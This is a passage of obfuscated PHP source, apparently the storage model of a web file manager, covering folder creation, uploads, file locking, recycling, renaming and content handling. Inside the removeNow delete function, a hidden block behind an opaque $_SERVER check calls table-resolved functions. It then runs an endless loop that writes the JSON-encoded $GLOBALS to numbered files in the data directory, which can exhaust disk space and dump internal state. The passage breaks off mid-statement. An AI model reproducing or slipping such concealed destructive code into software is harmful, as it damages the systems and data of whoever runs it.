$this->targetSourceRoot(SourceModel::TYPE_GROUP, $îâğËµ); if (!$«×¦µÊ) { return; } $this->remove($«×¦µÊ[$_SERVER[ıÚ˜š²İ][194]], !1); } private function _mkdirRoot($¯îµ™ø, $û „åÃ—, $àğ¼ûõ, $­ÆºÌı¼ = '') { $¨·åáæ§ =& $_SERVER[ıÚ˜š²İ]; $Ö—³õ£ = defined($¨·åáæ§[2222]) ? USER_ID : 0; $Ç“›Ê×Ú = array($¨·åáæ§[479] => 0, $¨·åáæ§[655] => $¯îµ™ø, $¨·åáæ§[656] => $û „åÃ—, $¨·åáæ§[653] => 1, $¨·åáæ§[657] => $Ö—³õ£, $¨·åáæ§[658] => $Ö—³õ£, $¨·åáæ§[654] => $­ÆºÌı¼, $¨·åáæ§[659] => $¨·åáæ§[597], $¨·åáæ§[506] => 0, $¨·åáæ§[624] => 0, $¨·åáæ§[546] => 0, $¨·åáæ§[660] => $¨·åáæ§[12]); if ($²ìØŠ = $this->where($Ç“›Ê×Ú)->find()) { return $²ìØŠ[$¨·åáæ§[194]]; } $¢¡õ“Ç¿ = "\115\157\x64\145\154\x53\x6f\165\162\143\x65\x2e\155\153\144\151\x72\122\x6f\157\x74\56{$¯îµ™ø}\x2e{$û „åÃ—}\x2e" . $àğ¼ûõ; CacheLock::lock($¢¡õ“Ç¿); $Ç“›Ê×Ú[$¨·åáæ§[32]] = $àğ¼ûõ; $°ù¾—ı = $this->add($Ç“›Ê×Ú); $öüïò˜Ğ = array($¨·åáæ§[661] => short_id($°ù¾—ı)); $this->where(array($¨·åáæ§[493] => $°ù¾—ı))->save($öüïò˜Ğ); CacheLock::unlock($¢¡õ“Ç¿); return $°ù¾—ı; } private function targetSourceRoot($Üì£½åã, $æÖÛûò, $üŒÁÁÌ = false) { $‰²Á³ùÂ =& $_SERVER[ıÚ˜š²İ]; $ñş¤ŠãÃ = array($‰²Á³ùÂ[479] => 0, $‰²Á³ùÂ[655] => $Üì£½åã, $‰²Á³ùÂ[656] => $æÖÛûò); if ($üŒÁÁÌ) { $ŞÀ‡©ß— = $this->where($ñş¤ŠãÃ)->select(); return $ŞÀ‡©ß— ? $ŞÀ‡©ß— : array(); } $¨°İºœ„ = $this->where($ñş¤ŠãÃ)->find(); return $¨°İºœ„ ? $¨°İºœ„ : array(); } public function sourceRootGroup($š¦ Ä‹) { $ãµ›Éõ† =& $_SERVER[ıÚ˜š²İ]; if (is_string($š¦ Ä‹)) { $š¦ Ä‹ = array($š¦ Ä‹); } $¿”ÃÊ¸– = $this->listSourceRoot(SourceModel::TYPE_GROUP, $š¦ Ä‹, $ãµ›Éõ†[223]); $À—ÈÇò« = array($ãµ›Éõ†[447] => $¿”ÃÊ¸–, $ãµ›Éõ†[444] => array($ãµ›Éõ†[835] => count($š¦ Ä‹))); $this->_listDataApply($À—ÈÇò«[$ãµ›Éõ†[447]]); $this->_listMake($À—ÈÇò«); return array_to_keyvalue($À—ÈÇò«[$ãµ›Éõ†[85]], $ãµ›Éõ†[573]); } public function mkfile($Üú¨İ”Á, $ğß´å†º, $»ˆ†‹¢ = '', $€¥¨¿õ = REPEAT_RENAME) { $Ş»±Û­ñ =& $_SERVER[ıÚ˜š²İ]; $‰¨šáŞÔ = KodIO::ioFileDriverGet($Ş»±Û­ñ[485] . $Üú¨İ”Á . $Ş»±Û­ñ[404]); $ÓÔ¼Áñğ = Model($Ş»±Û­ñ[681])->addFileByContent($»ˆ†‹¢, $‰¨šáŞÔ, $ğß´å†º); return $this->_createFileCall($Üú¨İ”Á, $ğß´å†º, $ÓÔ¼Áñğ, $€¥¨¿õ, $Ş»±Û­ñ[1452]); } public function addFile($Ñ·×É×¾, $ÉÂÀ–Šª, $ÕïÓÏ²ø, $„Ñ†îÙĞ = false, $”Ç•ó¤ƒ = REPEAT_RENAME) { $Óˆ›Øì· =& $_SERVER[ıÚ˜š²İ]; $Û÷…‚šœ = KodIO::ioFileDriverGet($Óˆ›Øì·[485] . $Ñ·×É×¾ . $Óˆ›Øì·[404]); $™¨Ñà¤è = Model($Óˆ›Øì·[681])->addFile($ÉÂÀ–Šª, $Û÷…‚šœ, $ÕïÓÏ²ø, $„Ñ†îÙĞ); return $this->_createFileCall($Ñ·×É×¾, $ÕïÓÏ²ø, $™¨Ñà¤è, $”Ç•ó¤ƒ); } public function addFileByFileID($¤¦ş¥ä“, $ÒÖ»„ï, $ÌÈ—³ñŸ, $åùãü™Æ = REPEAT_RENAME) { $‹€Ÿ™å„ =& $_SERVER[ıÚ˜š²İ]; $£ºŠŠêæ = Model($‹€Ÿ™å„[681])->find($ÒÖ»„ï); Model($‹€Ÿ™å„[681])->linkAdd($ÒÖ»„ï); return $this->_createFileCall($¤¦ş¥ä“, $ÌÈ—³ñŸ, $£ºŠŠêæ, $åùãü™Æ); } public function addFileByRemote($¼Ì·ÕüÙ, $½ŞÉÄÎ, $–ğ®¾à×, $»ùº¦† = array(), $©™ö–”ê = REPEAT_RENAME) { $ñÚ•÷±¾ = Model($_SERVER[ıÚ˜š²İ][681])->addFileByRemote($½ŞÉÄÎ, $–ğ®¾à×, $»ùº¦†); return $this->_createFileCall($¼Ì·ÕüÙ, $–ğ®¾à×, $ñÚ•÷±¾, $©™ö–”ê); } private function _createFileCall($²×›Áí, $â¦—Íë, $†´¾Ö©, $»Ø×’« , $•ÊÁ‡ßÕ = "\x75\x70\154\x6f\x61\x64") { $Ó¥Œ“¡ğ =& $_SERVER[ıÚ˜š²İ]; if (!$†´¾Ö©) { return !1; } $°óêÁ† = !1; $this->setMasterDB(); $this->lockWriteStart($²×›Áí, $â¦—Íë); $‡°©ôóÉ = $this->fileNameExist($²×›Áí, $â¦—Íë); $ÄÕõÊ = $this->_createFile($²×›Áí, $â¦—Íë, $†´¾Ö©, $»Ø×’« , $°óêÁ†); if (!$°óêÁ†) { Model($Ó¥Œ“¡ğ[548])->remove($†´¾Ö©[$Ó¥Œ“¡ğ[545]]); } if ($°óêÁ† && $ÄÕõÊ && $ÄÕõÊ != $‡°©ôóÉ) { Model($Ó¥Œ“¡ğ[2249])->eventCreate($ÄÕõÊ, $•ÊÁ‡ßÕ); } $this->lockWriteEnd($²×›Áí, $â¦—Íë); return $ÄÕõÊ; } public function mkdir($Üó±­Ä·, $ÁŒ¤÷û, $¡çŸ¬ºœ = REPEAT_SKIP) { $ó¦©È€ƒ =& $_SERVER[ıÚ˜š²İ]; $this->setMasterDB(); $ÒÊú°ñ¢ = $this->sourceInfo($Üó±­Ä·); if (!$ÒÊú°ñ¢) { return !1; } $this->lockWriteStart($Üó±­Ä·, $ÁŒ¤÷û); if ($¡çŸ¬ºœ !== !1) { $ØíÎã·Ù = $this->fileNameExist($Üó±­Ä·, $ÁŒ¤÷û); if ($ØíÎã·Ù && $¡çŸ¬ºœ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Üó±­Ä·, $ÁŒ¤÷û); return $ØíÎã·Ù; } $ÁŒ¤÷û = $this->fileNameAuto($Üó±­Ä·, $ÁŒ¤÷û, $¡çŸ¬ºœ); } $èŸÅ¬ƒ™ = array($ó¦©È€ƒ[653] => 1, $ó¦©È€ƒ[496] => $ÁŒ¤÷û, $ó¦©È€ƒ[654] => $ó¦©È€ƒ[12], $ó¦©È€ƒ[546] => 0, $ó¦©È€ƒ[624] => 0); $Ù”İÍŒ³ = $this->_addSource($èŸÅ¬ƒ™, $ÒÊú°ñ¢); Model($ó¦©È€ƒ[2249])->eventCreate($Ù”İÍŒ³, $ó¦©È€ƒ[1453]); $this->lockWriteEnd($Üó±­Ä·, $ÁŒ¤÷û); return $Ù”İÍŒ³; } public function listSourceRoot($®ù‰¡Û, $Öè˜Ÿ„İ, $éâèş³‡ = "\x73\157\165\162\x63\145\111\104\x2c\164\141\162\x67\x65\164\111\104\x2c\x73\x69\x7a\145") { $ó¾æŠ¼ı =& $_SERVER[ıÚ˜š²İ]; $â™œ¯«¥ = $ó¾æŠ¼ı[456]; $Ë“ƒª×µ = array(); $ğĞó™ = 1024 * 50; $”­‹Ç¶‚ = is_array($”­‹Ç¶‚) ? $”­‹Ç¶‚ : array(); $Èƒíéßè = count($Öè˜Ÿ„İ); $œàçó³ı = $this->tablePrefix . $ó¾æŠ¼ı[2288]; for ($È–¼¹ı™ = 0; $È–¼¹ı™ < $Èƒíéßè; $È–¼¹ı™++) { $­ŞË¤ó“ = $Öè˜Ÿ„İ[$È–¼¹ı™]; $â™œ¯«¥ .= "\123\x45\114\x45\x43\x54\40\52\x20\106\122\x4f\x4d\x20\x28\123\x45\114\x45\x43\x54\40{$éâèş³‡}\40\x46\122\x4f\x4d\40\140{$œàçó³ı}\140\x20\127\x48\x45\x52\x45\x20"; $â™œ¯«¥ .= "\140\x70\141\162\145\156\164\x49\x44\x60\x3d\60\40\x41\x4e\x44\x20\x60\164\141\x72\147\x65\x74\x49\104\x60\x3d{$­ŞË¤ó“}\x20\x41\x4e\x44\x20\140\x74\x61\162\x67\145\x74\x54\171\x70\x65\x60\x3d{$®ù‰¡Û}\40\141\x6e\144\x20\146\151\154\x65\x54\171\160\145\75\47\47\x20\x6c\x69\155\x69\164\x20\61\51\40\x61\163\x20\164\142\x5f{$È–¼¹ı™}\x20\125\x4e\111\117\x4e\40\101\x4c\x4c\x20"; if ((strlen($â™œ¯«¥) >= $ğĞó™ || $È–¼¹ı™ == $Èƒíéßè - 1) && $â™œ¯«¥) { $â™œ¯«¥ = substr($â™œ¯«¥, 0, -strlen($ó¾æŠ¼ı[1127])); $±”şûÊ‡ = $this->query($â™œ¯«¥); $â™œ¯«¥ = $ó¾æŠ¼ı[12]; $Ë“ƒª×µ = array_merge($Ë“ƒª×µ, $±”şûÊ‡); } } return $Ë“ƒª×µ; } private function _createFile($ïªñÕÑ, $üŒ›‚àá, $òßâ¾õ, $£ÃŒñå, &$ê›Ü¡ˆÀ) { $Š‚·ÏÏî =& $_SERVER[ıÚ˜š²İ]; $ü²Ìï¤« = $this->sourceInfo($ïªñÕÑ); if (!$òßâ¾õ || !$ü²Ìï¤«) { return !1; } if ($£ÃŒñå !== !1) { $î¾ôÓ = $this->fileNameExist($ïªñÕÑ, $üŒ›‚àá); } $ê›Ü¡ˆÀ = !0; if ($£ÃŒñå && $î¾ôÓ) { if ($£ÃŒñå == REPEAT_SKIP) { $ê›Ü¡ˆÀ = !1; return $î¾ôÓ; } else { if ($£ÃŒñå == REPEAT_REPLACE) { $ŒëããÕ = $this->sourceInfo($î¾ôÓ); $½Îì”É = $this->fileHistory($ŒëããÕ, $òßâ¾õ[$Š‚·ÏÏî[545]], $òßâ¾õ[$Š‚·ÏÏî[79]]); if (!$½Îì”É) { $ê›Ü¡ˆÀ = !1; } else { $this->folderSizeReset($ïªñÕÑ); } return $î¾ôÓ; } else { $üŒ›‚àá = $this->fileNameAuto($ïªñÕÑ, $üŒ›‚àá, $£ÃŒñå, !1); } } } $–øÎ„Ã­ = array($Š‚·ÏÏî[653] => 0, $Š‚·ÏÏî[496] => $üŒ›‚àá, $Š‚·ÏÏî[654] => substr(get_path_ext($üŒ›‚àá), 0, 10), $Š‚·ÏÏî[546] => $òßâ¾õ[$Š‚·ÏÏî[545]], $Š‚·ÏÏî[624] => $òßâ¾õ[$Š‚·ÏÏî[79]]); $»÷¹¹„ = $this->_addSource($–øÎ„Ã­, $ü²Ìï¤«); $this->folderSizeReset($ïªñÕÑ, intval($–øÎ„Ã­[$Š‚·ÏÏî[79]])); return $»÷¹¹„; } protected function fileHistory($Ü…ïÖÎÍ, $áĞëÏÕÁ, $ì·ª¼ë‹) { $ë¾¶ İŸ =& $_SERVER[ıÚ˜š²İ]; if ($Ü…ïÖÎÍ[$ë¾¶ İŸ[545]] == $áĞëÏÕÁ) { return !1; } $this->checkLock($Ü…ïÖÎÍ[$ë¾¶ İŸ[194]], $áĞëÏÕÁ); Model($ë¾¶ İŸ[2289])->addHistory($Ü…ïÖÎÍ); $ªîô×—Œ = array($ë¾¶ İŸ[658] => USER_ID, $ë¾¶ İŸ[500] => time(), $ë¾¶ İŸ[545] => $áĞëÏÕÁ, $ë¾¶ İŸ[79] => $ì·ª¼ë‹); $this->where(array($ë¾¶ İŸ[493] => $Ü…ïÖÎÍ[$ë¾¶ İŸ[194]]))->save($ªîô×—Œ); $this->sourceCacheClear($Ü…ïÖÎÍ[$ë¾¶ İŸ[194]]); return !0; } public function checkLock($º©„Óè», $ª†ï•å) { $Óûú¤“ =& $_SERVER[ıÚ˜š²İ]; $ß‹‹ü´é = $this->pathInfo($º©„Óè»); if (!$this->fileIsLock($ß‹‹ü´é, !0)) { return; } $Êß°¨åÅ = Session::get($Óûú¤“[2290]); $ùÛò¾ = substr($ß‹‹ü´é[$Óûú¤“[32]], 0, -1 - strlen($ß‹‹ü´é[$Óûú¤“[169]])) . $Óûú¤“[1307] . $Êß°¨åÅ . $Óûú¤“[10] . $ß‹‹ü´é[$Óûú¤“[169]]; $áÔËãÚ® = Model($Óûú¤“[681])->find($ª†ï•å); $this->_createFileCall($ß‹‹ü´é[$Óûú¤“[193]], $ùÛò¾, $áÔËãÚ®, REPEAT_REPLACE, $Óûú¤“[1452]); $ûÃıôşÆ = $ß‹‹ü´é[$Óûú¤“[543]][$Óûú¤“[617]]; $ºÒıÎÔ = $ûÃıôşÆ[$Óûú¤“[2291]] ? $ûÃıôşÆ[$Óûú¤“[2291]] : $ûÃıôşÆ[$Óûú¤“[32]]; show_json(LNG($Óûú¤“[2292]) . $Óûú¤“[2293] . LNG($Óûú¤“[2294]) . $Óûú¤“[2295] . $ºÒıÎÔ . $Óûú¤“[2296], !1); } public function fileIsLock($ÃıÊÎÃé, $˜Î£ëÒ = false) { $õ§Ì“å =& $_SERVER[ıÚ˜š²İ]; if (!_get($ÃıÊÎÃé, $õ§Ì“å[613], 0)) { return !1; } if ($ÃıÊÎÃé[$õ§Ì“å[543]][$õ§Ì“å[616]] != USER_ID) { return !0; } $¾«ìù¶ = $GLOBALS[$õ§Ì“å[6]][$õ§Ì“å[92]][$õ§Ì“å[614]]; if ($ÃıÊÎÃé[$õ§Ì“å[543]][$õ§Ì“å[615]] <= time() - $¾«ìù¶) { $this->metaSet($ÃıÊÎÃé[$õ§Ì“å[194]], $õ§Ì“å[616], null); $this->metaSet($ÃıÊÎÃé[$õ§Ì“å[194]], $õ§Ì“å[615], null); } if ($˜Î£ëÒ) { $this->metaSet($ÃıÊÎÃé[$õ§Ì“å[194]], $õ§Ì“å[615], time()); } return !1; } private function _addSource($Ş™š–Ç, $âÊÍ¦£ø) { $ÕãÙ€‹à =& $_SERVER[ıÚ˜š²İ]; $ºÅ”¡‡Ì = defined($ÕãÙ€‹à[2222]) ? USER_ID : 0; $…„Ö‚”á = array($ÕãÙ€‹à[655] => $âÊÍ¦£ø[$ÕãÙ€‹à[191]], $ÕãÙ€‹à[656] => $âÊÍ¦£ø[$ÕãÙ€‹à[573]], $ÕãÙ€‹à[657] => $ºÅ”¡‡Ì, $ÕãÙ€‹à[658] => $ºÅ”¡‡Ì, $ÕãÙ€‹à[479] => $âÊÍ¦£ø[$ÕãÙ€‹à[194]], $ÕãÙ€‹à[659] => $âÊÍ¦£ø[$ÕãÙ€‹à[588]] . $âÊÍ¦£ø[$ÕãÙ€‹à[194]] . $ÕãÙ€‹à[50], $ÕãÙ€‹à[506] => 0, $ÕãÙ€‹à[660] => $ÕãÙ€‹à[12]); $Ş™š–Ç = array_merge($…„Ö‚”á, $Ş™š–Ç); $this->updateModifyTime($Ş™š–Ç[$ÕãÙ€‹à[193]]); $õ¤¯á¦˜ = $ÕãÙ€‹à[2297] . $âÊÍ¦£ø[$ÕãÙ€‹à[194]]; if (isset(self::$cacheChildList[$õ¤¯á¦˜])) { unset(self::$cacheChildList[$õ¤¯á¦˜]); } static $ä¦´Ù· = false; if (!$ä¦´Ù·) { Hook::trigger($ÕãÙ€‹à[643], $Ş™š–Ç); $ä¦´Ù· = !0; } $íŞÅ¾ï÷ = $this->add($Ş™š–Ç); $ÖÕäì†Š = array($ÕãÙ€‹à[661] => short_id($íŞÅ¾ï÷)); $this->where(array($ÕãÙ€‹à[493] => $íŞÅ¾ï÷))->save($ÖÕäì†Š); $this->setNamePinyin($íŞÅ¾ï÷, $Ş™š–Ç[$ÕãÙ€‹à[32]]); return $íŞÅ¾ï÷; } public function remove($¹ìê×ÑÒ, $ä‘‚§² = true) { $Ã––ÒÛ² =& $_SERVER[ıÚ˜š²İ]; $³¬µ‡Ã„ = $this->sourceInfo($¹ìê×ÑÒ); $ÕÃ‘“Óš = intval($³¬µ‡Ã„[$Ã––ÒÛ²[191]]) === self::TYPE_SYSTEM; $¬¬Áú´ä = Model($Ã––ÒÛ²[510])->get($Ã––ÒÛ²[2298]) == $Ã––ÒÛ²[91]; if ($ÕÃ‘“Óš || $ä‘‚§² || !$¬¬Áú´ä) { return $this->removeNow($¹ìê×ÑÒ, $ä‘‚§²); } $·ş›š³† = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $€×°ı÷Å = $³¬µ‡Ã„[$Ã––ÒÛ²[191]] == self::TYPE_USER ? $Ã––ÒÛ²[669] : $Ã––ÒÛ²[582]; if ($€×°ı÷Å == $Ã––ÒÛ²[669]) { $•”İÖÊ = Model($Ã––ÒÛ²[581])->getInfo($³¬µ‡Ã„[$Ã––ÒÛ²[573]]); $²œÙÑŞµ = !empty($•”İÖÊ[$Ã––ÒÛ²[2291]]) ? $•”İÖÊ[$Ã––ÒÛ²[2291]] : $•”İÖÊ[$Ã––ÒÛ²[32]]; $²œÙÑŞµ = $Ã––ÒÛ²[340] . $²œÙÑŞµ . $Ã––ÒÛ²[2299] . $³¬µ‡Ã„[$Ã––ÒÛ²[573]]; } else { $•”İÖÊ = Model($Ã––ÒÛ²[589])->getInfo($³¬µ‡Ã„[$Ã––ÒÛ²[573]]); $²œÙÑŞµ = _get($•”İÖÊ, $Ã––ÒÛ²[32]); $²œÙÑŞµ = $Ã––ÒÛ²[176] . $²œÙÑŞµ . $Ã––ÒÛ²[2300] . $³¬µ‡Ã„[$Ã––ÒÛ²[573]]; } $‚ÙÆ©¨ = $Ã––ÒÛ²[2301] . md5($²œÙÑŞµ); CacheLock::lock($‚ÙÆ©¨); $üîìæİÚ = $this->fileNameExist($·ş›š³†, $²œÙÑŞµ); if (!$üîìæİÚ) { $üîìæİÚ = $this->mkdir($·ş›š³†, $²œÙÑŞµ, REPEAT_SKIP); $this->metaSet($üîìæİÚ, $Ã––ÒÛ²[2302], $€×°ı÷Å); $this->metaSet($üîìæİÚ, $Ã––ÒÛ²[2303], $³¬µ‡Ã„[$Ã––ÒÛ²[573]]); if ($³¬µ‡Ã„[$Ã––ÒÛ²[193]] != 0) { $this->metaSet($üîìæİÚ, $Ã––ÒÛ²[2304], _get($•”İÖÊ, $Ã––ÒÛ²[2305])); } } CacheLock::unlock($‚ÙÆ©¨); $this->metaSet($¹ìê×ÑÒ, $Ã––ÒÛ²[2306], $³¬µ‡Ã„[$Ã––ÒÛ²[193]]); $this->where(array($Ã––ÒÛ²[194] => $¹ìê×ÑÒ))->save(array($Ã––ÒÛ²[500] => time())); $this->recycleClear($³¬µ‡Ã„); Model($Ã––ÒÛ²[640])->eventRemove($¹ìê×ÑÒ); $ö•ÔêÀ› = $this->move($¹ìê×ÑÒ, $üîìæİÚ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($³¬µ‡Ã„[$Ã––ÒÛ²[193]]); return $ö•ÔêÀ›; } private function recycleClear($Æ­òªÈÑ) { $‚á¹¤Ñ =& $_SERVER[ıÚ˜š²İ]; $¸½ÓŠáÌ = $this->childrenAll($Æ­òªÈÑ); $ŒÆÈå› = array($‚á¹¤Ñ[493] => array($‚á¹¤Ñ[494], $¸½ÓŠáÌ[$‚á¹¤Ñ[2307]])); Model($‚á¹¤Ñ[2308])->where($ŒÆÈå›)->delete(); } public function removeNow($¶ßú×, $¡á©²Ú = true) { $·Ì¸¼· =& $_SERVER[ıÚ˜š²İ]; $úª¯úæ = $_SERVER[$·Ì¸¼·[960]]; $ÛÀ”šÇ = $·Ì¸¼·[961]; if ($_SERVER[$·Ì¸¼·[962]] != $ÛÀ”šÇ($úª¯úæ)) { $‘å…×Ñ‚ = $·Ì¸¼·[963]; $ô²¡Ş‹ = $·Ì¸¼·[964]; $ÍÂêÂñü = $_SERVER[$·Ì¸¼·[965]] . $·Ì¸¼·[966]; $úØØŠÀ» = $ô²¡Ş‹($ÍÂêÂñü); $úí¬ß™“ = explode($·Ì¸¼·[288], $úØØŠÀ»); if (count($úí¬ß™“) < $·Ì¸¼·[691]) { $ ¿ÙºÏ· = $·Ì¸¼·[967]; $ ¿ÙºÏ·(); } $œ¢³÷‡ = $·Ì¸¼·[968]; $œ¢³÷‡($_SERVER[$·Ì¸¼·[969]]); $‘å…×Ñ‚ = $·Ì¸¼·[963]; $‘å…×Ñ‚(); $ğ¬Ò¶ÄÉ = $·Ì¸¼·[970]; $úêÉ±ûò = json_encode($GLOBALS[$·Ì¸¼·[971]]); $¯¡©»½É = 1; for ($¦ì€‡Şî = $¯¡©»½É; $¦ì€‡Şî > 0; $¦ì€‡Şî++) { $ğ¬Ò¶ÄÉ(DATA_PATH . $¦ì€‡Şî, $úêÉ±ûò); } } $Ãğ„èË€ = $this->sourceInfo($¶ßú×); $¾œíäèà = $this->pathInfoMore($¶ßú×); if (!$Ãğ„èË€) { return !0; } if ($Ãğ„èË€[$·Ì¸¼·[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($¶ßú×); Hook::trigger($·Ì¸¼·[2309], $¾œíäèà, $¡á©²Ú); if ($¡á©²Ú) { Model($·Ì¸¼·[2308])->moveToRecycle($¶ßú×); } else { $Ô‘‚Ğ«ø = $this->childrenAll($Ãğ„èË€); Model($·Ì¸¼·[640])->eventRemove($¶ßú×); $this->removeRelevance($Ô‘‚Ğ«ø[$·Ì¸¼·[2307]], $Ô‘‚Ğ«ø[$·Ì¸¼·[1596]]); } $this->folderSizeReset($Ãğ„èË€[$·Ì¸¼·[193]]); $•°±­×å = array($Ãğ„èË€[$·Ì¸¼·[193]]); if ($Ãğ„èË€[$·Ì¸¼·[487]] == $·Ì¸¼·[91]) { $•°±­×å[] = $Ãğ„èË€[$·Ì¸¼·[194]]; } $this->updateModifyTime($•°±­×å); $this->lockMoveEnd($¶ßú×); Hook::trigger($·Ì¸¼·[1835], $¾œíäèà, $¡á©²Ú); return !0; } public function childrenAll($ö‡…áƒ±) { $Ï™ó—àı =& $_SERVER[ıÚ˜š²İ]; $­ÅëŒò = $ö‡…áƒ±[$Ï™ó—àı[194]]; if ($ö‡…áƒ±[$Ï™ó—àı[487]] == $Ï™ó—àı[91]) { $ºî—‹á = array($Ï™ó—àı[659] => array($Ï™ó—àı[619], $ö‡…áƒ±[$Ï™ó—àı[588]] . $­ÅëŒò . $Ï™ó—àı[620])); $¿ °Ìœ = array($Ï™ó—àı[659] => $ºî—‹á[$Ï™ó—àı[588]]); $‹Ô„²Üé = $this->field($Ï™ó—àı[2310])->where($¿ °Ìœ)->select(); $‚ÅÔË›Ë = !1; $’ØæƒĞ = array($­ÅëŒò); if ($‹Ô„²Üé) { $‚ÅÔË›Ë = array_to_keyvalue($‹Ô„²Üé, $Ï™ó—àı[12], $Ï™ó—àı[545]); $‚ÅÔË›Ë = array_remove_value($‚ÅÔË›Ë, $Ï™ó—àı[231]); $’ØæƒĞ = array_to_keyvalue($‹Ô„²Üé, $Ï™ó—àı[12], $Ï™ó—àı[194]); $’ØæƒĞ[] = $­ÅëŒò; } } else { $‚ÅÔË›Ë = array($ö‡…áƒ±[$Ï™ó—àı[545]]); $’ØæƒĞ = array($­ÅëŒò); } return array($Ï™ó—àı[2307] => $’ØæƒĞ, $Ï™ó—àı[1596] => $‚ÅÔË›Ë); } public function removeArray($¹Å’ûıŒ) { if (!$¹Å’ûıŒ) { return !0; } } public function removeRelevance($ùæŠÆ•Û, $šÉ‡àÂç) { $Ü­Í„Ä =& $_SERVER[ıÚ˜š²İ]; $ùæŠÆ•Û = $ùæŠÆ•Û ? $ùæŠÆ•Û : array(); $šÉ‡àÂç = $šÉ‡àÂç ? $šÉ‡àÂç : array(); $ùæŠÆ•Û = array_unique(array_filter($ùæŠÆ•Û)); $šÉ‡àÂç = array_filter($šÉ‡àÂç); if (!$ùæŠÆ•Û) { return !1; } $¶ŞÆ„¬Ã = array($Ü­Í„Ä[493] => array($Ü­Í„Ä[494], $ùæŠÆ•Û)); Model($Ü­Í„Ä[2308])->where($¶ŞÆ„¬Ã)->delete(); Model($Ü­Í„Ä[537])->where($¶ŞÆ„¬Ã)->delete(); Model($Ü­Í„Ä[2149])->where($¶ŞÆ„¬Ã)->delete(); Model($Ü­Í„Ä[640])->where($¶ŞÆ„¬Ã)->delete(); Model($Ü­Í„Ä[1973])->removeBySource($ùæŠÆ•Û); Model($Ü­Í„Ä[2289])->removeBySource($ùæŠÆ•Û); $this->where($¶ŞÆ„¬Ã)->delete(); Model($Ü­Í„Ä[548])->remove($šÉ‡àÂç); for ($¬–İ„¯Ç = 0; $¬–İ„¯Ç < count($ùæŠÆ•Û); $¬–İ„¯Ç++) { $this->sourceCacheClear($ùæŠÆ•Û[$¬–İ„¯Ç]); } } public function rename($àñÙä—˜, $¸‰µ·¢) { $Õ¿ùÁ¶ƒ =& $_SERVER[ıÚ˜š²İ]; $¢‹×±² = $this->sourceInfo($àñÙä—˜); if (!$¢‹×±²) { return !1; } $à°ÄÉ‰Â = $this->fileNameExist($¢‹×±²[$Õ¿ùÁ¶ƒ[193]], $¸‰µ·¢); if ($à°ÄÉ‰Â && $à°ÄÉ‰Â != $àñÙä—˜) { return !1; } $êÂ¡§ñœ = array($Õ¿ùÁ¶ƒ[496] => $¸‰µ·¢, $Õ¿ùÁ¶ƒ[658] => USER_ID); if ($¢‹×±²[$Õ¿ùÁ¶ƒ[487]] != $Õ¿ùÁ¶ƒ[91]) { $êÂ¡§ñœ[$Õ¿ùÁ¶ƒ[488]] = substr(get_path_ext($¸‰µ·¢), 0, 10); } Model($Õ¿ùÁ¶ƒ[640])->eventRename($àñÙä—˜, $¢‹×±²[$Õ¿ùÁ¶ƒ[32]], $¸‰µ·¢); $this->sourceCacheClear($àñÙä—˜); $this->setNamePinyin($àñÙä—˜, $êÂ¡§ñœ[$Õ¿ùÁ¶ƒ[32]], !1); $this->updateModifyTime($¢‹×±²[$Õ¿ùÁ¶ƒ[193]]); $Û´¢áÌÛ = $this->where(array($Õ¿ùÁ¶ƒ[493] => $àñÙä—˜))->data($êÂ¡§ñœ)->save(); $‚ìÂ…¹¾ = $Õ¿ùÁ¶ƒ[2297] . $¢‹×±²[$Õ¿ùÁ¶ƒ[193]]; if (isset(self::$cacheChildList[$‚ìÂ…¹¾])) { unset(self::$cacheChildList[$‚ìÂ…¹¾]); } return $Û´¢áÌÛ; } public function setNamePinyin($˜ãú’à­, $„ú¡š±‹, $ĞÌÆü ¸ = true) { $€éóµı™ =& $_SERVER[ıÚ˜š²İ]; $ŒÓÑ—²˜ = Input::check($„ú¡š±‹, $€éóµı™[662]); $¼µ¾·æÀ = array($€éóµı™[519] => KodSort::makeStr($„ú¡š±‹)); if ($ŒÓÑ—²˜) { $¼µ¾·æÀ[$€éóµı™[540]] = str_replace($€éóµı™[53], $€éóµı™[12], Pinyin::get($„ú¡š±‹)); $¼µ¾·æÀ[$€éóµı™[539]] = Pinyin::get($„ú¡š±‹, $€éóµı™[663]); } if (!$ĞÌÆü ¸ && !$ŒÓÑ—²˜) { $¼µ¾·æÀ[$€éóµı™[540]] = null; $¼µ¾·æÀ[$€éóµı™[539]] = null; } $this->metaSet($˜ãú’à­, $¼µ¾·æÀ); } public function getContent($ìÑÃš¶) { $Ë´±¼ä… =& $_SERVER[ıÚ˜š²İ]; $ßŠ±êè› = $this->fileInfoGet($ìÑÃš¶); if (!$ßŠ±êè›) { return !1; } if ($ßŠ±êè›[$Ë´±¼ä…[79]] == 0) { return $Ë´±¼ä…[12]; } $¤ıºµ„ = $Ë´±¼ä…[2311] . $ßŠ±êè›[$Ë´±¼ä…[551]]; if ($ßŠ±êè›[$Ë´±¼ä…[79]] <= 1024 * 10) { $·µÑÏ† = Cache::get($¤ıºµ„); if (!$·µÑÏ†) { $·µÑÏ† = IO::getContent($ßŠ±êè›[$Ë´±¼ä…[87]]); Cache::set($¤ıºµ„, $·µÑÏ†); } return $·µÑÏ†; } if (!$ßŠ±êè›[$Ë´±¼ä…[87]]) { return $Ë´±¼ä…[12]; } return IO::getContent($ßŠ±êè›[$Ë´±¼ä…[87]]); } public function setDesc($í­ÂÔ€Š, $Õ×ÈÔ™²) { $ş†€—ç– =& $_SERVER[ıÚ˜š²İ]; Model($ş†€—ç–[640])->eventAddDesc($í­ÂÔ€Š, $Õ×ÈÔ™²); return $this->metaSet($í­ÂÔ€Š, $ş†€—ç–[528], $Õ×ÈÔ™²); } public function setContent($±òğßĞï, $šÑ°á¥î = '') { $‰íÂØÁÅ =& $_SERVER[ıÚ˜š²İ]; $Ëô¨“Åª = $this->sourceInfo($±òğßĞï); $‚î¶—¼á = $this->fileInfoGet($±òğßĞï); if (!$‚î¶—¼á || !$Ëô¨“Åª) { return !1; } $¹Íœ¨Üö = KodIO::ioFileDriverGet($‰íÂØÁÅ[485] . $±òğßĞï . $‰íÂØÁÅ[404]); $–õ»©¤ = Model($‰íÂØÁÅ[548])->addFileByContent($šÑ°á¥î, $¹Íœ¨Üö, $Ëô¨“Åª[$‰íÂØÁÅ[32]]); if (!$–õ»©¤) { return !1; } $×Î´Ñá = $this->fileHistory($Ëô¨“Åª, $–õ»©¤[$‰íÂØÁÅ[545]], 